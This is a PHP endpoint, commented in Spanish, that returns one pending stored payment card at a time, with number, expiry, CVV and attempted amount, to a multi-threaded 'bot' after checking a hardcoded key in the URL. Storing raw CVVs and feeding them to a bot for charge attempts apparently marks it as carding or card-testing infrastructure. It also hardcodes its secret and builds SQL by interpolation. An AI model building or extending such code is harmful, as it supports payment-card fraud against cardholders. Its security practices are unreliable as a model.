<?php
// Subimos un nivel para encontrar la configuración en includes
require '../includes/config.php';
header('Content-Type: application/json');

/**
 * OWEN_SYSTEMS: SECURE_DATA_EXTRACTOR
 * Solo permite el acceso mediante una llave maestra.
 */

// 1. PROTOCOLO DE AUTENTICACIÓN POR LLAVE
// Define tu llave en config.php o cámbiala aquí directamente
$master_key = "ALCUDIA_2026"; 
$provided_key = isset($_GET['key']) ? $_GET['key'] : '';

if ($provided_key !== $master_key) {
    http_response_code(403);
    die(json_encode([
        "status" => "CRITICAL_ERROR",
        "message" => "INVALID_AUTH_KEY. Access denied by OWEN_CORE."
    ]));
}

// 2. BÚSQUEDA DE NODOS PENDIENTES (LIFO: Last In, First Out)
// En tu código anterior usaste DESC (la más reciente), en el anterior ASC (la más antigua). 
// Usaremos DESC para que tu bot procese lo último que entró primero.
$query = "SELECT id, user_id, cc_number, cc_exp, cc_cvv, monto_intento 
          FROM vault_cards 
          WHERE status = 'pendiente' 
          ORDER BY id DESC 
          LIMIT 1";

$res = $conn->query($query);

if ($res && $res->num_rows > 0) {
    $card = $res->fetch_assoc();
    $id = $card['id'];

    // 3. BLOQUEO DE NODO (Status: procesando)
    // Esto evita colisiones si tienes varios hilos del bot corriendo
    $conn->query("UPDATE vault_cards SET status = 'procesando' WHERE id = $id");

    // 4. RESPUESTA DE DATOS
    $card['system_status'] = "SUCCESS_EXTRACTION";
    $card['timestamp'] = date("Y-m-d H:i:s");
    
    echo json_encode($card);
} else {
    // Respuesta si la bóveda está limpia
    echo json_encode([
        "status" => "VAULT_CLEAN",
        "message" => "No pending nodes found in database."
    ]);
}
?>
